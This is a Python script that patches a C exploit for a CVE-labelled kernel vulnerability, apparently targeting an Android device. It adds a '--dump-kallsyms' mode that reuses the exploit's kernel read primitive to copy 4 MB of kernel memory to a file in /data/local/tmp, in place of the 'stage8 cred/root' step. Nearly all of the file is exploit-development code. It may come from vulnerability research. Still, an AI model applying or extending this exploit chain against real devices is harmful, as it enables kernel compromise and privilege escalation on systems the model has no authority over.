#!/usr/bin/env python3
"""Add a read-only --dump-kallsyms mode: stage0/misc bridge, then read the
kernel image kallsyms window, then restore and exit (no stage8 cred/root)."""
import pathlib
import sys

SRC = 'cve-2026-64560-pd2545.c'
p = pathlib.Path(SRC)
s = p.read_text(encoding='utf-8')
if 'KALLSYMS_DUMP_PASS' in s:
    print('already patched')
    sys.exit(0)

# 1) dump function before main
anchor = 'int main(int argc, char **argv) {'
func = r'''static int dump_kallsyms_window(int bridge_fd, struct pipe_reclaim_probe *probe) {
    struct physical_layout layout;
    const uint64_t image = LINK_IMAGE_BASE + kernel_slide;
    const uint64_t start = 0x1400000;
    const size_t total = 0x400000;
    const size_t chunk = 0x8000;
    unsigned char *buf;
    int out = -1;
    int result = -1;

    buf = malloc(chunk);
    if (!buf)
        return -1;
    if (load_physical_layout(bridge_fd, &layout))
        goto out;
    out = open("/data/local/tmp/pd2545_kallsyms_window.bin",
               O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) {
        printf("KALLSYMS_DUMP_FAIL stage=open errno=%d\n", errno);
        goto out;
    }
    for (size_t off = 0; off < total; off += chunk) {
        size_t n = total - off < chunk ? total - off : chunk;

        if (kernel_read_virtual(bridge_fd, probe, &layout,
                                image + start + off, buf, n)) {
            printf("KALLSYMS_DUMP_FAIL stage=read off=%#zx errno=%d\n", off, errno);
            goto out;
        }
        if (write(out, buf, n) != (ssize_t)n) {
            printf("KALLSYMS_DUMP_FAIL stage=write off=%#zx errno=%d\n", off, errno);
            goto out;
        }
    }
    printf("KALLSYMS_DUMP_PASS image=%#llx start=%#llx len=%#zx "
           "path=/data/local/tmp/pd2545_kallsyms_window.bin\n",
           (unsigned long long)image, (unsigned long long)start, total);
    result = 0;
out:
    if (out >= 0)
        close(out);
    free(buf);
    return result;
}

'''
if s.count(anchor) != 1:
    sys.exit('main anchor not unique')
s = s.replace(anchor, func + anchor)

# 2) mode variable
anchor = '    int stage0_pass = 0;\n    int attempt;\n'
new = '    int stage0_pass = 0;\n    int attempt;\n    int dump_kallsyms_mode = 0;\n'
if s.count(anchor) != 1:
    sys.exit('attempt anchor not unique')
s = s.replace(anchor, new)

# 3) accept the mode
anchor = '''    if (argc != 2 || (strcmp(argv[1], "--preflight") && strcmp(argv[1], "--run"))) {
        fprintf(stderr, "usage: %s --preflight | --probe-task | --run\\n", argv[0]);
        return 2;
    }
    configure_standalone(argv);'''
new = '''    if (argc != 2 || (strcmp(argv[1], "--preflight") && strcmp(argv[1], "--run") &&
                      strcmp(argv[1], "--dump-kallsyms"))) {
        fprintf(stderr, "usage: %s --preflight | --probe-task | --run | --dump-kallsyms\\n",
                argv[0]);
        return 2;
    }
    dump_kallsyms_mode = !strcmp(argv[1], "--dump-kallsyms");
    configure_standalone(argv);'''
if s.count(anchor) != 1:
    sys.exit('mode anchor not unique')
s = s.replace(anchor, new)

# 4) dump instead of stage8 root
anchor = '            { int root_result = run_stage8_root_probe(bridge_fd, &pipe_probe);'
new = '''            if (dump_kallsyms_mode) {
                int dump_result = dump_kallsyms_window(bridge_fd, &pipe_probe);

                printf("KALLSYMS_DUMP_%s path=/data/local/tmp/pd2545_kallsyms_window.bin "
                       "errno=%d\\n", dump_result ? "FAIL" : "PASS", errno);
                status = dump_result ? 12 : 0;
                goto bridge_cleanup;
            }
            { int root_result = run_stage8_root_probe(bridge_fd, &pipe_probe);'''
if s.count(anchor) != 1:
    sys.exit('stage8 anchor not unique')
s = s.replace(anchor, new)
p.write_text(s, encoding='utf-8')
print('dump-kallsyms mode added; bytes', len(s))
